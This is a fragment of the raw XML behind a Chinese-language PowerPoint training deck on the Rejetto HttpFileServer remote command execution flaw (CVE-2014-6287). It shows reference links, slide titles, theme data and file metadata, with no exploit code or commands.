                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>https://forum.hackthebox.eu/discussion/137/optimum-write-up-by-alamot</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="109728" indent="0" rtl="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0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608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訓練課程簡報">
  <a:themeElements>
    <a:clrScheme name="中庸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4615_TF03460604.potx" id="{459C345E-EC57-4CE6-8378-CD5A0E02B40D}" vid="{75388508-C140-4AE9-B3F8-1A15F21DF63F}"/>
    </a:ext>
  </a:extLst>
</a:theme>
</file>

<file path=ppt/theme/theme2.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office 佈景主題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364</TotalTime>
  <Words>473</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>寬螢幕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14</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="22" baseType="lpstr">
      <vt:lpstr>ArialMT</vt:lpstr>
      <vt:lpstr>Microsoft JhengHei UI</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Georgia</vt:lpstr>
      <vt:lpstr>Helvetica</vt:lpstr>
      <vt:lpstr>Wingdings 2</vt:lpstr>
      <vt:lpstr>訓練課程簡報</vt:lpstr>
      <vt:lpstr>Rejetto HttpFileServer Remote Command Execution</vt:lpstr>
      <vt:lpstr>Abstract</vt:lpstr>
      <vt:lpstr>Info</vt:lpstr>
      <vt:lpstr>Info</vt:lpstr>
      <vt:lpstr>Info</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit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漏洞資訊-SolarWinds Orion Platform部分版本存在後門程式，允許攻擊者遠端執行任意程式碼，請儘速確認並進行版本更新</dc:title>
  <dc:creator>zihling chen</dc:creator>
  <cp:lastModifiedBy>zihling chen</cp:lastModifiedBy>
  <cp:revision>131</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-12-29T03:57:03Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-12-29T18:10:14Z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